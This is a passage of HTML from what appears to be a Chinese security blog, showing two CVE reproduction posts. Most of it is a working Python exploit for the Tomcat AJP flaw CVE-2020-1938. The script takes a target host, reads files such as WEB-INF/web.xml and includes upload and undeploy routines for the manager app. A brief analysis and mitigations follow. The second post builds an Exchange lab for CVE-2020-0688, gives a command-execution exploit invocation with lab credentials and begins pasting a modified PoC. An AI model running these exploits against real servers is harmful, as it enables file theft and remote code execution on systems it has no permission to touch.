class="string">"12345"</span>)&#125;]</span><br><span class="line">        <span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">            attributes.append(&#123;<span class="string">"name"</span>: <span class="string">"query_string"</span>, <span class="string">"value"</span>: deploy_csrf_token&#125;)</span><br><span class="line">        old_apps = self.list_installed_applications(user, password, old_version)</span><br><span class="line">        r = self.perform_request(<span class="string">"/manager/html/upload"</span>, headers=headers, method=<span class="string">"POST"</span>, user=user, password=password,</span><br><span class="line">                                 attributes=attributes)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"/tmp/request"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">            br.send_and_receive(self.socket, self.stream)</span><br><span class="line"></span><br><span class="line">        r = AjpResponse.receive(self.stream)</span><br><span class="line">        <span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            logger.error(<span class="string">'Upload failed'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:</span><br><span class="line">            r = AjpResponse.receive(self.stream)</span><br><span class="line">        logger.debug(<span class="string">'Upload seems normal. Checking...'</span>)</span><br><span class="line">        new_apps = self.list_installed_applications(user, password, old_version)</span><br><span class="line">        <span class="keyword">if</span> len(new_apps) == len(old_apps) + <span class="number">1</span> <span class="keyword">and</span> new_apps[:<span class="number">-1</span>] == old_apps:</span><br><span class="line">            logger.info(<span class="string">'Upload success!'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.error(<span class="string">'Upload failed'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_error_page</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.perform_request(<span class="string">"/blablablablabla"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_version</span><span class="params">(self)</span>:</span></span><br><span class="line">        hdrs, data = self.get_error_page()</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">            s = re.findall(<span class="string">'(Apache Tomcat/[0-9\.]+) '</span>, d.data)</span><br><span class="line">            <span class="keyword">if</span> len(s) &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_csrf_token</span><span class="params">(self, user, password, old_version, headers=&#123;&#125;, query=[])</span>:</span></span><br><span class="line">        <span class="comment"># first we request the manager page to get the CSRF token</span></span><br><span class="line">        hdrs, rdata = self.perform_request(<span class="string">"/manager/html"</span>, headers=headers, user=user, password=password)</span><br><span class="line">        deploy_csrf_token = re.findall(<span class="string">'(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"'</span>,</span><br><span class="line">                                       <span class="string">""</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> rdata]))</span><br><span class="line">        <span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">if</span> len(deploy_csrf_token) == <span class="number">0</span>:</span><br><span class="line">                logger.critical(<span class="string">"Failed to get CSRF token. Check the credentials"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            logger.debug(<span class="string">'CSRF token = %s'</span> % deploy_csrf_token[<span class="number">0</span>])</span><br><span class="line">        obj = re.match(<span class="string">"(?P&lt;cookie&gt;JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly"</span>,</span><br><span class="line">                       hdrs.response_headers.get(<span class="string">'Set-Cookie'</span>, <span class="string">''</span>))</span><br><span class="line">        <span class="keyword">if</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> deploy_csrf_token[<span class="number">0</span>], obj</span><br><span class="line">        <span class="keyword">return</span> deploy_csrf_token[<span class="number">0</span>], <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_installed_applications</span><span class="params">(self, user, password, old_version, headers=&#123;&#125;)</span>:</span></span><br><span class="line">        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"SC_REQ_REFERER"</span>: <span class="string">"http://%s/manager/html/"</span> % (self.target_host),</span><br><span class="line">            <span class="string">"Origin"</span>: <span class="string">"http://%s"</span> % (self.target_host),</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            headers[<span class="string">"SC_REQ_COOKIE"</span>] = obj_cookie.group(<span class="string">'cookie'</span>)</span><br><span class="line"></span><br><span class="line">        attributes = [&#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"JK_LB_ACTIVATION"</span>, <span class="string">"ACT"</span>)&#125;,</span><br><span class="line">                      &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>,</span><br><span class="line">                       <span class="string">"value"</span>: (<span class="string">"AJP_REMOTE_PORT"</span>, <span class="string">"&#123;&#125;"</span>.format(self.socket.getsockname()[<span class="number">1</span>]))&#125;]</span><br><span class="line">        <span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">            attributes.append(&#123;</span><br><span class="line">                <span class="string">"name"</span>: <span class="string">"query_string"</span>, <span class="string">"value"</span>: <span class="string">"%s"</span> % deploy_csrf_token&#125;)</span><br><span class="line">        hdrs, data = self.perform_request(<span class="string">"/manager/html/"</span>, headers=headers, method=<span class="string">"GET"</span>, user=user, password=password,</span><br><span class="line">                                          attributes=attributes)</span><br><span class="line">        found = []</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">            im = re.findall(<span class="string">'/manager/html/expire\?path=([^&amp;]*)&amp;'</span>, d.data)</span><br><span class="line">            <span class="keyword">for</span> app <span class="keyword">in</span> im:</span><br><span class="line">                found.append(unquote(app))</span><br><span class="line">        <span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">undeploy</span><span class="params">(self, path, user, password, old_version, headers=&#123;&#125;)</span>:</span></span><br><span class="line">        deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">        path_app = <span class="string">"path=%s"</span> % path</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_TYPE"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">            <span class="string">"SC_REQ_CONTENT_LENGTH"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"SC_REQ_REFERER"</span>: <span class="string">"http://%s/manager/html/"</span> % (self.target_host),</span><br><span class="line">            <span class="string">"Origin"</span>: <span class="string">"http://%s"</span> % (self.target_host),</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            headers[<span class="string">"SC_REQ_COOKIE"</span>] = obj_cookie.group(<span class="string">'cookie'</span>)</span><br><span class="line"></span><br><span class="line">        attributes = [&#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>, <span class="string">"value"</span>: (<span class="string">"JK_LB_ACTIVATION"</span>, <span class="string">"ACT"</span>)&#125;,</span><br><span class="line">                      &#123;<span class="string">"name"</span>: <span class="string">"req_attribute"</span>,</span><br><span class="line">                       <span class="string">"value"</span>: (<span class="string">"AJP_REMOTE_PORT"</span>, <span class="string">"&#123;&#125;"</span>.format(self.socket.getsockname()[<span class="number">1</span>]))&#125;]</span><br><span class="line">        <span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">            attributes.append(&#123;</span><br><span class="line">                <span class="string">"name"</span>: <span class="string">"query_string"</span>, <span class="string">"value"</span>: <span class="string">"%s&amp;%s"</span> % (path_app, deploy_csrf_token)&#125;)</span><br><span class="line">        r = self.perform_request(<span class="string">"/manager/html/undeploy"</span>, headers=headers, method=<span class="string">"POST"</span>, user=user, password=password,</span><br><span class="line">                                 attributes=attributes)</span><br><span class="line">        r = AjpResponse.receive(self.stream)</span><br><span class="line">        <span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            logger.error(<span class="string">'Undeploy failed'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check the successful message</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        regex = <span class="string">r'&lt;small&gt;&lt;strong&gt;Message:&lt;\/strong&gt;&lt;\/small&gt;&amp;nbsp;&lt;\/td&gt;\s*&lt;td class="row-left"&gt;&lt;pre&gt;(OK - .*'</span> + path + <span class="string">')\s*&lt;\/pre&gt;&lt;\/td&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:</span><br><span class="line">            r = AjpResponse.receive(self.stream)</span><br><span class="line">            <span class="keyword">if</span> r.prefix_code == <span class="number">3</span>:</span><br><span class="line">                f = re.findall(regex, r.data)</span><br><span class="line">                <span class="keyword">if</span> len(f) &gt; <span class="number">0</span>:</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            logger.info(<span class="string">'Undeploy succeed'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.error(<span class="string">'Undeploy failed'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'target'</span>, type=str, help=<span class="string">"Hostname or IP to attack"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=int, default=<span class="number">8009</span>, help=<span class="string">"AJP port to attack (default is 8009)"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-f"</span>, <span class="string">'--file'</span>, type=str, default=<span class="string">'WEB-INF/web.xml'</span>, help=<span class="string">"file path :(WEB-INF/web.xml)"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    bf = Tomcat(args.target, args.port)</span><br><span class="line">    attributes = [</span><br><span class="line">        &#123;<span class="string">'name'</span>: <span class="string">'req_attribute'</span>, <span class="string">'value'</span>: [<span class="string">'javax.servlet.include.request_uri'</span>, <span class="string">'/'</span>]&#125;,</span><br><span class="line">        &#123;<span class="string">'name'</span>: <span class="string">'req_attribute'</span>, <span class="string">'value'</span>: [<span class="string">'javax.servlet.include.path_info'</span>, args.file]&#125;,</span><br><span class="line">        &#123;<span class="string">'name'</span>: <span class="string">'req_attribute'</span>, <span class="string">'value'</span>: [<span class="string">'javax.servlet.include.servlet_path'</span>, <span class="string">'/'</span>]&#125;,</span><br><span class="line">    ]</span><br><span class="line">    snd_hdrs_res, data_res = bf.perform_request(req_uri=<span class="string">'/'</span>,method=<span class="string">'GET'</span>, attributes=attributes)</span><br><span class="line">    print(<span class="string">""</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data_res]))</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>如下图所示，我读取了靶机的<code>WEB-INF/web.xml</code>，在第326行代码里默认路径也是<code>WEB-INF/web.xml</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-d46ea4b0760494eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>我主要参考了安全客发布的一篇文章：</p>
+<p><code>https://www.anquanke.com/post/id/199347</code></p>
+<p>在tomcat中，conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口。此外conf目录还存放了用户名口令等信息。处理ajp请求时候</p>
+<p><code>org.apache.coyote.ajp.AjpProcessor</code>会将ajp内容变成request对象，</p>
+<p>我不太懂java，但是据大佬所说Orz：可以控制request对象的三个属性：</p>
+<p><code>javax.servlet.include.request_uri</code></p>
+<p><code>javax.servlet.include.path_info</code></p>
+<p><code>javax.servlet.include.servlet_path</code></p>
+<p>然后继续servlet映射流程：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-1c4e60929d1d19cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>如图所示，servlet就是在Http服务器和数据库之间的一个中间层，查阅相关资料可知，servlet的作用主要有如下五点，详情参见：<code>https://www.runoob.com/servlet/servlet-intro.html</code></p>
+<ul>
+<li><pre><code>读取客户端（浏览器）发送的显式的数据。这包括网页上的 HTML 表单，或者也可以是来自 applet 或自定义的 HTTP 客户端程序的表单。
+读取客户端（浏览器）发送的隐式的 HTTP 请求数据。这包括 cookies、媒体类型和浏览器能理解的压缩格式等等。
+处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。
+发送显式的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（HTML 或 XML）、二进制文件（GIF 图像）、Excel 等。
+发送隐式的 HTTP 响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（例如 HTML），设置 cookies 和缓存参数，以及其他类似的任务。</code></pre></li>
+</ul>
+<p>利用方式：</p>
+<ol>
+<li>DefaultServlet实现任意文件下载</li>
+<li>jspservlet任意后缀文件包含</li>
+</ol>
+<h2 id="防范方式："><a href="#防范方式：" class="headerlink" title="防范方式："></a>防范方式：</h2><p>用不存在该漏洞版本的tomcat</p>
+<p>禁用Ajp协议的8009端口</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/07/Poc%20of%20CVE-2020-1938/" data-id="ck7h5xsou0005xsb3edo87hit" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Poc of CVE-2020-0688" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/07/Poc%20of%20CVE-2020-0688/" class="article-date">
+  <time datetime="2020-03-07T05:23:58.640Z" itemprop="datePublished">2020-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/07/Poc%20of%20CVE-2020-0688/">CVE-2020-0688</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-0688任意代码执行漏洞"><a href="#CVE-2020-0688任意代码执行漏洞" class="headerlink" title="CVE-2020-0688任意代码执行漏洞"></a>CVE-2020-0688任意代码执行漏洞</h1><h2 id="Exchange-Server"><a href="#Exchange-Server" class="headerlink" title="Exchange Server"></a>Exchange Server</h2><p>Exchange Server 是微软公司开发的邮件服务器，在很多国家得到了广泛的应用。如下图所示为360安全大脑-Quake网络空间测绘系统提供的Exchange服务器分布情况：</p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306165146837.png" alt="image-20200306165146837"></p>
+<p>而该漏洞可以通过一个普通权限的用户来获得以SYSTEM权限执行任意代码的能力，危害相当大。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Exchange_Server_2010_SP3</p>
+<p>Exchange_Server_2013</p>
+<p>Exchange_Server_2016</p>
+<p>Exchange_Server_2019</p>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>首先我建立了两台虚拟机，一台Windos Server 2016_Standard搭载了Exchange Server 2013 CU3的靶机和一台Kali Linux 2019.04用作测试机</p>
+<h3 id="靶机部署过程如下："><a href="#靶机部署过程如下：" class="headerlink" title="靶机部署过程如下："></a>靶机部署过程如下：</h3><p>由于现有的网上复现过程主要是围绕着对靶机的测试，而没有对靶机环境搭建有详细介绍，因此我从会介绍的比较详细，希望师傅们别喷我！</p>
+<h4 id="下载所需的文件"><a href="#下载所需的文件" class="headerlink" title="下载所需的文件"></a>下载所需的文件</h4><p>下载Windos Server 2016</p>
+<p><code>https://pan.baidu.com/s/1paR0NIP9Xct_XXBb0ibf-w&amp;shfl=sharepset</code> </p>
+<p>下载Exchange Server 2013 CU3，其实CU3以上的都可以，过低版本的Exchange有些先决条件已经不支持，所以一定下载高版本的！！踩坑得出的经验！！！</p>
+<p><code>http://www.exchangecn.com/tag/exchange-2013?72874.html</code></p>
+<p>安装Windows Server 2016</p>
+<p>这没啥说的，不再赘述，注意安装包含（图形体验）的，方便安装，不然安装好后没有图形界面。</p>
+<h4 id="安装Exchange-Server-2013"><a href="#安装Exchange-Server-2013" class="headerlink" title="安装Exchange Server 2013"></a>安装Exchange Server 2013</h4><p>之后我参考了霖雨大佬的部署步骤，踩了很多坑之后发现这篇博客很详细，我就是一步步按照大佬的操作安装成的：</p>
+<p><code>https://www.cnblogs.com/jianyus/archive/2013/07/04/3170732.html</code></p>
+<p>在你的windos server 2016 会让你配置角色，点开按照如下操作：（以下图片均复制霖雨，原因是自己配置这个快吐了，不想再重复截图了……）</p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000501-e7c48962e0024894b7fae840ef9202fa.png" alt="clip_image002"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000502-6236869684cf415baaec3dc3304f7e5f.png" alt="clip_image003"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000507-4f6ff333a9ab48419d0f99d1c1b31706.png" alt="clip_image005"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000508-cfcaf3a1b0724327aa41cbdb264ef5cf.png" alt="clip_image006"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000510-bd1dc36c28d943e1ab253b21d950c997.png" alt="clip_image008"></p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306161254354.png" alt="image-20200306161254354"></p>
+<p>（当然是John，所以我的图片就是JohnServer……）</p>
+<h5 id="安装AD域服务"><a href="#安装AD域服务" class="headerlink" title="安装AD域服务"></a>安装AD域服务</h5><p><img src="https://images0.cnblogs.com/blog/256729/201307/04000514-c3a98cd0367b47a78c7916764a15b6f8.png" alt="clip_image013"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000516-caa4b61617a14c0caacd6a2017e603ac.png" alt="clip_image015"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000519-9035d8f34c0d48cdb087977c37333ad2.png" alt="clip_image019"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000520-f997e030beb94f17a9d6232a84b35e88.png" alt="clip_image020"></p>
+<p>这个时候就需要重新配置，因为没有林，所以直接选择添加新林，根域名自己写我的是<code>John.com</code></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000522-5089dc85d1a64a6c80c5559c4619d961.png" alt="clip_image022"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000526-286ad3b9fed848abba1c82a5cbf26190.png" alt="clip_image027"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000528-6fd2a746fe7945b09fba9a82c0e2690e.png" alt="clip_image028"></p>
+<p>然后就会自动重启，霖雨的图片说明比我更详细，我只对关键部分几个可能会存在疑问的配置问题放了图……</p>
+<h5 id="准备域"><a href="#准备域" class="headerlink" title="准备域"></a>准备域</h5><p>安装<code>Remote Tools Administration Pack</code>，在powershell下运行：<code>Install –WindowsFeature RSAT-ADDS</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-264736cc9699c843.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2 (2).PNG"></p>
+<p>然后把你下载的Exchange解压缩，在Exchange解压缩后的目录下打开命令行，输入<code>setup /IAcceptExchangeServerLicenseTerms /PrepareSchema</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-b65bda2fb3897948.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3 (2).PNG"></p>
+<p>然后继续安装，输入<code>setup /IAcceptExchangeServerLicenseTerms /PrepareAD /OrganizationName:JohnOrganization</code>(你是哪个机构就写成XXOrganization)</p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306162353534.png" alt="image-20200306162353534"></p>
+<h5 id="TIPS：没事敲几下回车，有时候已经安装好了，但是没有回显，还一直以为在安装……"><a href="#TIPS：没事敲几下回车，有时候已经安装好了，但是没有回显，还一直以为在安装……" class="headerlink" title="TIPS：没事敲几下回车，有时候已经安装好了，但是没有回显，还一直以为在安装……"></a>TIPS：没事敲几下回车，有时候已经安装好了，但是没有回显，还一直以为在安装……</h5><h5 id="检查是否安装好"><a href="#检查是否安装好" class="headerlink" title="检查是否安装好"></a>检查是否安装好</h5><p>打开ADSI编辑器，在运行中输入：<code>ADSIEDIT.msc</code>，然后连接到：</p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306162603105.png" alt="image-20200306162603105"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-0acdcce8a59cd47e.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5 (2).PNG"></p>
+<p>找<code>CN=ms-Exch-Schema-Verision-Pt</code>，右键属性，看rangeUpper，15137则成功：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-5e2ce8112dd02228.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6 (2).PNG"></p>
+<p>后面霖雨大佬还检查了其他的，我检查了一个15137就不检查了，相信自己RP！</p>
+<h5 id="安装必备软件"><a href="#安装必备软件" class="headerlink" title="安装必备软件"></a>安装必备软件</h5><p>用powershell，运行<code>Install-WindowsFeature AS-HTTP-Activation, Desktop-Experience, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, Web-Mgmt-Console, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation</code></p>
+<p>果然powershell，NB！但是如果你安装包版本低于CU3，就会报错，而且官方提供的解决方式都没用！</p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306162939261.png" alt="image-20200306162939261"></p>
+<p>之后还需要安装必备软件</p>
+<p>安装<code>[Microsoft Unified Communications Managed API 4.0, Core Runtime 64-bit]</code></p>
+<p><code>http://go.microsoft.com/fwlink/p/?linkId=258269</code></p>
+<p>安装<code>[Microsoft Office 2010 Filter Pack 64 位]</code></p>
+<p><code>http://go.microsoft.com/fwlink/p/?linkID=191548</code></p>
+<p>安装<code>[Microsoft Office 2010 Fil ter Pack SP1 64 位]</code></p>
+<p><code>http://go.microsoft.com/fwlink/p/?LinkId=254043</code></p>
+<h5 id="至此，所有准备工作完成，开始安装"><a href="#至此，所有准备工作完成，开始安装" class="headerlink" title="至此，所有准备工作完成，开始安装"></a>至此，所有准备工作完成，开始安装</h5><p>前面的步骤直接略过，都是一路默认。然后不需要修复：</p>
+<p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306163609899.png" alt="image-20200306163609899"></p>
+<p>恶意软件检查：否</p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000553-54e3be0eb76242d4988a97c02d41044c.png" alt="clip_image051"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000554-9e2d78cb5ab345ddbe8eeb55dd13d242.png" alt="clip_image054"></p>
+<p>安装完之后就可以进入管理中心，以管理员身份登录，并创建普通帐号：</p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000556-1fc8a07f98954ed4883aa15224b1dfec.png" alt="clip_image056"></p>
+<p><img src="https://images0.cnblogs.com/blog/256729/201307/04000603-febea74eaf7b4d96ae4ad8b435e26901.png" alt="clip_image062"></p>
+<p>创建完成邮件服务器之后，我们有了个普通用户权限的帐号和口令，开始测试！！</p>
+<h2 id="用于测试主机部署"><a href="#用于测试主机部署" class="headerlink" title="用于测试主机部署"></a>用于测试主机部署</h2><p>我用的是Kali Linux作为测试主机，代码我参考的是</p>
+<p>本菜鸟用的是github上<code>https://github.com/Ridter/cve-2020-0688</code>的poc代码，一般大家环境变量肯定都设好了，我不再赘述，用的是Python3,下载下来后先进入目录，然后用terminal执行poc代码:</p>
+<p><code>python3 cve-2020-0688.py -s 172.16.67.132 -u John -p 1qaz2wsx! -c &quot;ping www.baidu.com&quot;</code></p>
+<p>我的靶机ip是172.16.67.132，然后John/1qaz2wsx!是一个普通用户用户名/口令,执行了ping baidu的指令。</p>
+<p>具体用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage: cve-2020-0688.py [-h] -s SERVER -u USER -p PASSWORD -c CMD</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -s SERVER, --server SERVER</span><br><span class="line">                        ECP Server URL Example: http:&#x2F;&#x2F;ip&#x2F;owa</span><br><span class="line">  -u USER, --user USER  login account Example: domain\user</span><br><span class="line">  -p PASSWORD, --password PASSWORD</span><br><span class="line">                        Password</span><br><span class="line">  -c CMD, --cmd CMD     Command you want to execute</span><br></pre></td></tr></table></figure>
+
+<p>因为原作者的poc代码在本地执行存在点儿小问题，我把修改后的poc代码贴在下面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> readline</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(url, user, pwd)</span>:</span></span><br><span class="line">	print(<span class="string">"[*] Tring to login owa..."</span>)</span><br><span 